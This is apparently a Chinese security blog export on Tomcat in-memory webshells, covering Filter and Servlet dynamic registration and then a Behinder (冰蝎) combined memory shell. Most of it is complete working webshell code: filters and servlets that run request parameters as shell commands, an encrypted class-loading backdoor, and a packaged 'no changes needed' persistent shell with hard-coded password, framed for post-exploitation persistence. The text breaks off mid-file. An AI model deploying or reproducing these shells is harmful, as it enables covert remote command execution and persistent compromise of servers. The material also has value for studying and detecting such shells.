我们直接在ApplicationFilterConfig的构造函数那里打个断点，然后调试，看看初始化的时候FilterDef对象中有啥

![](https://s3.hedgedoc.org/demo/uploads/3c2b90fa-cac3-4ea4-92cc-143fe3b8fd30.png)

可以看到，此时的FilterDef对象中，设置了filter、filterClass、filterName、asyncSupported四个属性

1. filter就是Filter对象
2. filterClass就是Filter对象的class
3. filterName就是Filter对象的名称
4. asyncSupported不知道是啥，照葫芦画瓢也设置成"true"
## 3.4、动态注册Filter实现内存马
综上所述，想要将我们的Filter加入到StandardContext.filters中，代码逻辑如下：
1. 写一个Filter
2. 获取到一个StandardContext对象
3. 创建一个FilterDef对象
  a. 设置FilterDef.filterName
  b. 设置FilterDef.filterClass
  c. 设置FilterDef.filter
  d. 设置FilterDef.asyncSupported
4. 将FilterDef对象加入到StandardContext.filterDefs中
5. 创建一个FilteMap对象
  a. 设置FilteMap.FilterName
  b. 设置FilteMap.urlPatterns
  c. 设置FilteMap.dispatcherMapping
6. 将FilteMap对象加入到StandardContext.FilterMaps中
7. 通过StandardContext和FilterDef两个对象，反射创建一个ApplicationFilterConfig对象
8. ApplicationFilterConfig对象(filter对象)通过HashMap.put()方法加入进StandardContext.filterConfigs中

完整jsp代码如下
```
<%@ page import="org.apache.catalina.connector.RequestFacade" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.util.HashMap" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="java.io.PrintWriter" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.Context" %>
<%@page language="java" contentType="text/html; charset=UTF-8" %>

<%-- Filter --%>
<%
    class MyFilter implements Filter {
        @Override
        public void init(FilterConfig filterConfig) throws ServletException {
        }

        @Override
        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
            String commmand = servletRequest.getParameter("filter_cmd");
            if(commmand != null) {
                try {
                    Runtime.getRuntime().exec(commmand);
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
            }
        }

        @Override
        public void destroy() {
        }
    }

    MyFilter myFilter = new MyFilter();
    String filterName = "lan";
%>

<%-- 获取到StandardContext对象 --%>
<%
    RequestFacade requestFacade = (RequestFacade) request;
    Class requestFacadeClass = requestFacade.getClass();
    Field getRequestField = requestFacadeClass.getDeclaredField("request");
    getRequestField.setAccessible(true);
    Request getRequest = (Request) getRequestField.get(requestFacade);
    StandardContext standardContext = (StandardContext) getRequest.getContext();
%>

<%-- 创建一个FilterDef对象 --%>
<%
    FilterDef filterDef = new FilterDef();
    filterDef.setFilterName(filterName);
    filterDef.setFilterClass(myFilter.getClass().getName());
    filterDef.setFilter(myFilter);
    filterDef.setAsyncSupported("true");
%>

<%-- 将FilterDef对象加入到StandardContext.filterDefs中 --%>
<%
    standardContext.addFilterDef(filterDef);
%>

<%-- 创建一个FilteMap对象 --%>
<%
    FilterMap filterMap = new FilterMap();
    filterMap.addURLPattern("/myfilter");
    filterMap.setFilterName(filterName);
    filterMap.setDispatcher(DispatcherType.REQUEST.name());
%>

<%-- 将FilteMap对象加入到StandardContext.FilterMaps中 --%>
<%
    standardContext.addFilterMap(filterMap);
%>

<%-- 获取到ApplicationFilterConfig对象 --%>
<%
    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
    constructor.setAccessible(true);
    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);
%>

<%-- 将filter添加到filterConfigs中 --%>
<%
    Field filterConfigsField = standardContext.getClass().getDeclaredField("filterConfigs");
    filterConfigsField.setAccessible(true);
    HashMap filterConfigs = (HashMap) filterConfigsField.get(standardContext);
    filterConfigs.put(filterName,filterConfig);
%>

```

顺便说一嘴，将FilteMap对象加入到StandardContext.FilterMaps中时候，可以用StandardContext.addFilterMapBefore()方法，这个方法的作用是将Filter对象添加到链条的第一位，也就是每次触发filter时候都是优先我们的链条
## 3.5、验证
在web.xml中没有添加Filter的情况下，输入路由/myfilter?filter_cmd=notepad

![](https://s3.hedgedoc.org/demo/uploads/235cca7d-a65e-4c99-a95f-ca722b64e7b3.png)

没有弹出记事本，毫无反应

访问实现动态注册的MyFilter.jsp

![](https://s3.hedgedoc.org/demo/uploads/15bd2a17-3aac-42c7-9ffb-6f8fdfde1817.png)

再次访问路由/myfilter?filter_cmd=notepad

![](https://s3.hedgedoc.org/demo/uploads/ea09c2c0-3183-4dc6-9819-a40672f2b6a8.png)

成功弹出记事本
# 4、Servlet内存马
## 4.1、简述
Servlet主要用于处理请求并生成响应，因此其主要作用是在Web应用程序中实现服务器端的业务逻辑。

而Servlet是封装在Wrapper中，每一个Servlet都对应了一个Wrapper，当请求从Context向特定的Wrapper发送时，其实就是向Servlet发送，所以，也可以将Wrapper看作是一个Servlet
## 4.2、编写一个Servlet
首先写一个Servlet，然后在web.xml中配置

```
package com.tomcatd0.servlet;

import javax.servlet.*;
import java.io.IOException;

public class MyServlet implements Servlet {

    @Override
    public void init(ServletConfig servletConfig) throws ServletException {

    }

    @Override
    public ServletConfig getServletConfig() {
        return null;
    }

    @Override
    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
        String commmand = servletRequest.getParameter("servlet_cmd");
        if(commmand != null) {
            try {
                Runtime.getRuntime().exec(commmand);
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }
    }

    @Override
    public String getServletInfo() {
        return null;
    }

    @Override
    public void destroy() {

    }
}

```

```
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0">
    
    <servlet>
        <servlet-name>MyServlet</servlet-name>
        <servlet-class>com.tomcatd0.servlet.MyServlet</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>MyServlet</servlet-name>
        <url-pattern>/myservlet</url-pattern>
    </servlet-mapping>

</web-app>
    

```

访问路由：/myservlet?servlet_cmd=calc

成功弹出计算器
## 4.3、调用链分析
在service()方法边上打个断点

![](https://s3.hedgedoc.org/demo/uploads/6aa7d808-a3ce-44de-a38e-e25692f95618.png)

开启调试，调用链如下：

![](https://s3.hedgedoc.org/demo/uploads/3477af1c-ff6c-41e7-b0a3-882cce2a46cb.png)

这里进入了ApplicationFilterChain.internalDoFilter()方法，可以看到，第118行有Servlet对象调用了service()方法，后面我们需要关注这个Servlet对象咋来的

![](https://s3.hedgedoc.org/demo/uploads/4137f19e-2f35-418b-a013-b12c2c0bf247.png)

跟进一下this.service，可以看到，ApplicationFilterChain.service没有初始化（值为null），我们搜一下关键字“this.servlet”看看有哪个方法可以给他赋值的

![](https://s3.hedgedoc.org/demo/uploads/361184fe-6d4a-4758-a3e5-5a31eef76a8f.png)

180行的ApplicationFilterChain.setServlet()方法可以，那么后面我们就注意看看哪条链调用了ApplicationFilterChain.setServlet()方法，主要是注意关键字“ApplicationFilterChain”和“setServlet(”

![](https://s3.hedgedoc.org/demo/uploads/8255f30e-c2e7-4137-82f8-d513dc884ca6.png)

这里跟进到了StandardWrapperValve.invoke()方法，第97行实例化了个ApplicationFilterChain，跟进ApplicationFilterFactory.createFilterChain()方法

![](https://s3.hedgedoc.org/demo/uploads/09c3f4c2-de2f-4f82-a4b6-a6aaa6d3a77f.png)

在ApplicationFilterFactory.createFilterChain()方法中，第40行调用了ApplicationFilterChain.setServlet()方法，我们跟进一下它的参数servlet

![](https://s3.hedgedoc.org/demo/uploads/7e75690c-6421-487e-99c7-6948a7137c0f.png)

确认到是传参传入的servlet，我们又需要回到StandardWrapperValve.invoke()方法，因为是StandardWrapperValve.invoke()方法中调用了ApplicationFilterFactory.createFilterChain()方法的

![](https://s3.hedgedoc.org/demo/uploads/8891ed1e-3507-45b6-9fd4-4e1c3d546190.png)

我们跟进下StandardWrapperValve.invoke()方法中第98行传入的servlet，看看servlet咋来的

![](https://s3.hedgedoc.org/demo/uploads/cbf934e2-4d38-4f97-9648-4ee173d8c54e.png)

这里的servlet也是没有初始化的，继续往下面看代码

![](https://s3.hedgedoc.org/demo/uploads/bd116cd1-d006-4152-92a9-c4fa78386ec1.png)

第65行有一个if条件，此时unavailable是false，!false=true，所以进入到了servlet = wrapper.allocate();，我们可以知道，servlet来自StandardWrapper.allocate()方法，我们跟进StandardWrapper.allocate()

![](https://s3.hedgedoc.org/demo/uploads/c885a5f2-f020-4ac2-a7d9-667ab7167d70.png)

下面我们对StandardWrapper.allocate()方法进行分析

![](https://s3.hedgedoc.org/demo/uploads/4dd45e97-6da0-4dcf-a91e-7e7c7c302f71.png)

根据StandardWrapper的属性和StandardWrapper.allocate()方法的代码逻辑，最终会走到337行的代码，看上面的图，this.instance其实就一个Servlet对象

不过有意思的来了，代码第331行有两条路可以走，如果this.instance还没有初始化（==null），那就会走到第337行进行初始化；如果已经初始化了（!=null），那就直接返回Servlet

![](https://s3.hedgedoc.org/demo/uploads/33b58178-d62a-4410-94af-badca7390972.png)

作为一条懒狗，少一事不如多一事，我们搜一下关键字“this.instance”看看有没有直接可以初始化的函数

第247行StandardWrapper.setServlet()方法满足这个条件

![](https://s3.hedgedoc.org/demo/uploads/6d07ec33-0c1c-421a-b6d7-791c25815814.png)

ok，Servlet知道是咋可以搞的了，所以我们只需要将Wrapper装入StandardContext中，然后正常触发就完成了

因为组件都是继承于ContainerBase这个抽象类，所以都会用父组件的addChild()方法将子组件添加到父组件中

这里我们跟进到StandardContext.addChild()方法

![](https://s3.hedgedoc.org/demo/uploads/49d69119-80dd-44b3-8e5c-caa21f12a683.png)

首先会通过Servlet名字判断这个Servlet是否为jsp（红框1），如果不是，就将child（StandardWrapper）添加到StandardContext中（红框2），然后再给这个child添加一个路由映射（红框3）
## 4.4、动态注册Servlet实现内存马
综上所述，想要将我们的Servlet动态注册，代码逻辑如下：
1. 写一个Servlet
2. 获取一个StandardContext
3. 获取一个StandardWrapper对象
4. 将StandardWrapper加入到StandardContext
5. 设置StandardWrapper路由映射
完整jsp代码如下：
```
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.catalina.Wrapper" %>
<%@ page import="org.apache.catalina.connector.RequestFacade" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%
    RequestFacade requestFacade = (RequestFacade) request;
    Class requestFacadeClass = requestFacade.getClass();
    Field getRequestField = requestFacadeClass.getDeclaredField("request");
    getRequestField.setAccessible(true);
    Request getRequest = (Request) getRequestField.get(requestFacade);
    StandardContext standardContext = (StandardContext) getRequest.getContext();
%>

<%!

    public class MyServlet implements Servlet {
        @Override
        public void init(ServletConfig config) throws ServletException {
        }
        @Override
        public ServletConfig getServletConfig() {
            return null;
        }
        @Override
        public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
            String cmd = req.getParameter("servlet_cmd");
            if (cmd !=null){
                try{
                    Runtime.getRuntime().exec(cmd);
                }catch (IOException e){
                    e.printStackTrace();
                }catch (NullPointerException n){
                    n.printStackTrace();
                }
            }
        }
        @Override
        public String getServletInfo() {
            return null;
        }
        @Override
        public void destroy() {
        }
    }
    MyServlet myServlet = new MyServlet();

%>

<%
    String name = myServlet.getClass().getSimpleName();

    Wrapper wrapper = standardContext.createWrapper();
    wrapper.setName(name);
    wrapper.setServlet(myServlet);
%>

<%
    standardContext.addChild(wrapper);
    standardContext.addServletMappingDecoded("/myservlet",name);
%>

```
## 4.5、验证
在web.xml中没有添加Servlet的情况下，输入路由/myservlet?servlet_cmd=notepad

![](https://s3.hedgedoc.org/demo/uploads/57d64579-6cf5-410c-a91f-67d0dc857d86.png)

![](https://s3.hedgedoc.org/demo/uploads/a48492aa-e611-4bcd-9236-d40221d17e62.png)

没有弹出记事本，毫无反应

访问实现动态注册的MyServlet.jsp

![](https://s3.hedgedoc.org/demo/uploads/830850f2-cd61-49b3-a4a5-e9a1cb310a7d.png)

再次访问路由/myservlet?servlet_cmd=notepad

![](https://s3.hedgedoc.org/demo/uploads/d6cc7d76-5ca4-4bdc-85bd-7cd9068d4e95.png)

成功弹出记事本

# 5、总结
Listener内存马：
1. 将我们的Listener添加到applicationEventListenersList中即可

Filter内存马：
1. 设置FilterDef对象，其中包含了Filter的配置属性，然后添加到StandardContext.filterDefs
2. 设置FilteMap对象，其中包含了Filter的映射路由StandardContext.filterMaps
3. 设置ApplicationFilterConfig对象，并将其添加到StandardContext.filterConfigs

Servlet内存马：
1. 设置一个Wrapper对象，其中包含了Servlet的配置属性
2. 将Wrapper添加到StandardContext对象中
3. 在StandardContext中设置Wrapper的访问路由

# 6、完结？
好像还有一个value内存马，在houst中触发的？
不过内存马先暂时告落一段时间
顺便说一下，在学了tomcat基础知识后，就真的好懂了很多
接下来要的去学冰蝎马如何编写的，内存马+冰蝎

# 7、学习
https://blog.csdn.net/weixin_41835612/category_10674061.html

https://xz.aliyun.com/t/10196

https://goodapple.top/archives/1355

http://oceaner.cn/2023/06/11/tomcat-nei-cun-ma/





























































]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>内存马</tag>
      </tags>
  </entry>
  <entry>
    <title>Tomcat冰蝎内存马</title>
    <url>/2023/08/22/Tomcat%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    <content><![CDATA[# 1、简述
目前打内存马的场景鄙人就遇到了两种
1. 上传jsp文件，然后访问，注入内存马
2. 通过序列化漏洞如log4j2、fastjson直接打进入
不过第二种情况用得比第一种多，直接拿webshell维权

最终的webshell都是放入冰蝎或者哥斯拉等进行管理或者后渗透，所以接下来就将学一下

# 2、冰蝎
这里用Filter举例

首先我们的Filter的jsp内存马子如下：
```
<%@ page import="org.apache.catalina.connector.RequestFacade" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.util.HashMap" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.Context" %>
<%@page language="java" contentType="text/html; charset=UTF-8" %>

<%-- Filter --%>
<%
    class MyFilter implements Filter {
        @Override
        public void init(FilterConfig filterConfig) throws ServletException {
        }

        @Override
        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
            String commmand = servletRequest.getParameter("filter_cmd");
            if(commmand != null) {
                String osName = System.getProperty("os.name");
                if (osName.toLowerCase().contains("win")) {
                    Runtime.getRuntime().exec(new String[]{"cmd", "/c", commmand});
                } else {
                    Runtime.getRuntime().exec(new String[]{"bash", "-c", commmand});
                }
            }
        }

        @Override
        public void destroy() {
        }
    }

    MyFilter myFilter = new MyFilter();
    String filterName = "lan";
%>

<%-- 获取到StandardContext对象 --%>
<%
    RequestFacade requestFacade = (RequestFacade) request;
    Class requestFacadeClass = requestFacade.getClass();
    Field getRequestField = requestFacadeClass.getDeclaredField("request");
    getRequestField.setAccessible(true);
    Request getRequest = (Request) getRequestField.get(requestFacade);
    StandardContext standardContext = (StandardContext) getRequest.getContext();
%>

<%-- 创建一个FilterDef对象 --%>
<%
    FilterDef filterDef = new FilterDef();
    filterDef.setFilterName(filterName);
    filterDef.setFilterClass(myFilter.getClass().getName());
    filterDef.setFilter(myFilter);
    filterDef.setAsyncSupported("true");
%>

<%-- 将FilterDef对象加入到StandardContext.filterDefs中 --%>
<%
    standardContext.addFilterDef(filterDef);
%>

<%-- 创建一个FilteMap对象 --%>
<%
    FilterMap filterMap = new FilterMap();
    filterMap.addURLPattern("/*");
    filterMap.setFilterName(filterName);
    filterMap.setDispatcher(DispatcherType.REQUEST.name());
%>

<%-- 将FilteMap对象加入到StandardContext.FilterMaps中 --%>
<%
    standardContext.addFilterMap(filterMap);
%>

<%-- 获取到ApplicationFilterConfig对象 --%>
<%
    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
    constructor.setAccessible(true);
    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);
%>

<%-- 将filter添加到filterConfigs中 --%>
<%
    Field filterConfigsField = standardContext.getClass().getDeclaredField("filterConfigs");
    filterConfigsField.setAccessible(true);
    HashMap filterConfigs = (HashMap) filterConfigsField.get(standardContext);
    filterConfigs.put(filterName,filterConfig);
%>

```
这里有2个坑:

获取Context对象这里没有用ServletRequest取，而是直接从线程中取的：https://xz.aliyun.com/t/9914

在获取到StandardContext.filterConfigs这个成员变量的时候，用standardContext.getClass().getDeclaredField("filterConfigs")方法无法获取到，要用Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("filterConfigs")才行，搞了好久nnd

效果：

![](https://s3.hedgedoc.org/demo/uploads/886e8d08-6267-425b-807c-2ce01a93990e.png)

![](https://s3.hedgedoc.org/demo/uploads/70642830-e1ab-40b3-a61f-d7008b3a65fc.png)

接着看下冰蝎的jsp马子

```
<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>
```

看不懂，换行缩进回车一下

```
<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%>
<%@ page import="sun.misc.BASE64Decoder" %>
<%!
    class U extends ClassLoader{
        U(ClassLoader c){
            super(c);
        }
        public Class g(byte []b){
            return super.defineClass(b,0,b.length);
        }
    }
%>
<%
    if (request.getMethod().equals("POST")){
        String k="e45e329feb5d925b";
        session.putValue("u",k);
        Cipher c=Cipher.getInstance("AES");
        c.init(2,new SecretKeySpec(k.getBytes(),"AES"));
        String body = request.getReader().readLine();
        BASE64Decoder base64Decoder = new BASE64Decoder();
        byte[] baseDecodeByte = base64Decoder.decodeBuffer(body);
        byte[] aesDecodeByte = c.doFinal(baseDecodeByte);
        U newu = new U(this.getClass().getClassLoader());
        Class classU = newu.g(aesDecodeByte);
        Object newclass = classU.newInstance();
        boolean result = newclass.equals(pageContext);
    }
%>

<% out.print("success!"); %>

```

稍微分析一下

首先对定义一个ClassLoader类，它的方法g()作用是调用ClassLoader.defineClass()方法将传入的byte[]转化为Class对象

![](https://s3.hedgedoc.org/demo/uploads/3903d225-3e35-47a6-ab94-59f41eb8cb3e.png)

然后判断请求的是否为POST请求，如果是，就读取数据包的请求体中的内容，然后Base64+AES解码得到数据码（aesDecodeByte）

![](https://s3.hedgedoc.org/demo/uploads/f0b6a84c-4a3e-4a2b-b082-6f65e0c8cdc2.png)

接着，再将数据码传入到ClassLoader.defineClass()方法中转化为Class对象，最后，调用newInstance()实例化个对象，并调用其恶意对象的equals方法，传入pageContext，结束

![](https://s3.hedgedoc.org/demo/uploads/0358ad1d-6c3f-46cf-b46a-45b8ac09d8c8.png)

然要将冰蝎马与java源码结合，我们就直接将冰蝎马的代码逻辑放入之前写好的Filter内存马（java源码）中

```
import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

/**
 * 不用改了
 * 标准的cmd内存马&冰蝎马
 * 用法   http://xxx.xxx.xxx.x/?cmd=whoami
 * 密码：lan
 * 2023/08/03
 */
public class BxieMem lantesta ClassLoader implements Filter{

    String passwd = "73f50c9f17291ce9";

    static {
        try {
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();

            Filter myFilter = new lantesta();
            String filterName = "lan";


            FilterDef filterDef = new FilterDef();
            filterDef.setFilterName(filterName);
            filterDef.setFilterClass(myFilter.getClass().getName());
            filterDef.setFilter(myFilter);
            filterDef.setAsyncSupported("true");
            standardContext.addFilterDef(filterDef);

            FilterMap filterMap = new FilterMap();
            filterMap.addURLPattern("/");
            filterMap.setFilterName(filterName);
            filterMap.setDispatcher(DispatcherType.REQUEST.name());
            standardContext.addFilterMap(filterMap);

            Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
            constructor.setAccessible(true);
            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);

            Field filterConfigsField = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("filterConfigs");
            filterConfigsField.setAccessible(true);
            HashMap filterConfigs = (HashMap) filterConfigsField.get(standardContext);

            filterConfigs.put(filterName,filterConfig);


        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        String command = servletRequest.getParameter("cmd");
        if (command != null){
            String system = System.getProperty("os.name");
            if (system.toLowerCase().contains("win")) {
                Process process = Runtime.getRuntime().exec(new String[]{"cmd.exe","/c",command});
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                StringBuilder stringBuilder = new StringBuilder();
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    stringBuilder.append(line + '\n');
                }

                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
                servletResponse.getOutputStream().flush();
                servletResponse.getOutputStream().close();
            } else {
                Process process = Runtime.getRuntime().exec(new String[]{"bash","-c",command});
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                StringBuilder stringBuilder = new StringBuilder();
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    stringBuilder.append(line + '\n');
                }

                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
                servletResponse.getOutputStream().flush();
                servletResponse.getOutputStream().close();
            }
        }

        HttpServletRequest request = (HttpServletRequest) servletRequest;
        HttpServletResponse response = (HttpServletResponse) servletResponse;
        HttpSession session = request.getSession();

        Map<String, Object> pageContext = new HashMap<String, Object>();
        pageContext.put("session", session);
        pageContext.put("request", request);
        pageContext.put("response", response);

        ClassLoader cl = (ClassLoader) Thread.currentThread().getContextClassLoader();

        if (request.getMethod().equals("POST")) {
            if (cl.getClass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                //从java.lang.ClassLoader中获取到Class对象
                Class Lclass = cl.getClass().getSuperclass();
                //调用RushThere()方法，将冰蝎逻辑写入内存马中
                RushThere(Lclass, cl, session, request, pageContext);
            } else if (cl.getClass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                Class Lclass = cl.getClass().getSuperclass().getSuperclass();
                RushThere(Lclass, cl, session, request, pageContext);
            } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass();
                RushThere(Lclass, cl, session, request, pageContext);
            } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                RushThere(Lclass, cl, session, request, pageContext);
            } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                RushThere(Lclass, cl, session, request, pageContext);
            } else {
                Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                RushThere(Lclass, cl, session, request, pageContext);
            }
            filterChain.doFilter(servletRequest, servletResponse);
        }
        filterChain.doFilter(servletRequest,servletResponse);
    }

    //下面是冰蝎马子的代码逻辑
    public void RushThere(Class Lclass, ClassLoader cl, HttpSession session, HttpServletRequest request,Map<String, Object> pageContext){
        //bytecode其实就是冰蝎马中自定义的ClassLoader的class内容，不过被base64编码过后的
        byte[] bytecode = java.util.Base64.getDecoder().decode("yv66vgAAADQAGgoABAAUCgAEABUHABYHABcBAAY8aW5pdD4BABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADTFU7AQABYwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAWIBAAJbQgEAClNvdXJjZUZpbGUBAAZVLmphdmEMAAUABgwAGAAZAQABVQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsAIQADAAQAAAAAAAIAAAAFAAYAAQAHAAAAOgACAAIAAAAGKiu3AAGxAAAAAgAIAAAABgABAAAAAgAJAAAAFgACAAAABgAKAAsAAAAAAAYADAANAAEAAQAOAA8AAQAHAAAAPQAEAAIAAAAJKisDK763AAKwAAAAAgAIAAAABgABAAAAAwAJAAAAFgACAAAACQAKAAsAAAAAAAkAEAARAAEAAQASAAAAAgAT");
        try {
            //获取到ClassLoader.defineClass()方法
            Method define = Lclass.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            define.setAccessible(true);
            Class uclass = null;
            //下面的try，总之就是要获取到类U的Class对象
            try {
                //通过ClassLoader.loadClass()方法获取到类U的Class对象
                uclass = cl.loadClass("U");
            } catch (ClassNotFoundException e) {
                //如果没有找到类U的Class对象，就用ClassLoader.defineClass()方法获取
                uclass = (Class) define.invoke(cl, bytecode, 0, bytecode.length);
            }
            //从类U的Class对象中获取构造方法
            Constructor constructor = uclass.getDeclaredConstructor(ClassLoader.class);
            constructor.setAccessible(true);
            //获取到当前类的对象
            Object u = constructor.newInstance(this.getClass().getClassLoader());
            //获取类U的方法g()
            Method Um = uclass.getDeclaredMethod("g", byte[].class);
            Um.setAccessible(true);
            String k = passwd;
            //将密码写入session中
            session.setAttribute("u", k);
            Cipher c = Cipher.getInstance("AES");
            c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
            //从请求体中获取到base64数据，然后先base64解码，最后aes加密，获取到原始的class数据
            byte[] eClassBytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
            //通过类U的方法g()，将原始的class数据转化为Class对象eclass
            Class eclass = (Class) Um.invoke(u, eClassBytes);
            //实例化客户端传来的class文件，得到一个Object对象a
            Object a = eclass.newInstance();
            //从对象eclass中获取到方法equals
            Method b = eclass.getDeclaredMethod("equals", Object.class);
            b.setAccessible(true);
            //调用equals对象
            b.invoke(a, pageContext);
        }catch (Exception e){
            e.printStackTrace();
        }
    }
    

    @Override
    public void destroy() {

    }
}

```

效果：

![](https://s3.hedgedoc.org/demo/uploads/ab6978a7-e4bc-481f-a849-d79554f4b0fd.png)

![](https://s3.hedgedoc.org/demo/uploads/b506c559-4a2f-473d-b157-b0c9c4a89077.png)

![](https://s3.hedgedoc.org/demo/uploads/c14c29af-d3c4-451a-9e9c-448b29225168.png)

over

# 3、完整代码
## 3.1、java源码
### 3.1.1、Listener
```
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpSession;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

/**
 * 不用改了
 * 标准的cmd内存马&冰蝎马
 * 用法:
 *  1、执行命令：http://xxx.xxx.xxx.x/?cmd=whoami
 *  2、冰蝎连接：http://xxx.xxx.xxx.x/ 密码：lan
 *
 * 2023/08/03
 */
public class TLbx extends ClassLoader implements ServletRequestListener{

    String passwd = "73f50c9f17291ce9";

    static {
        try {
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
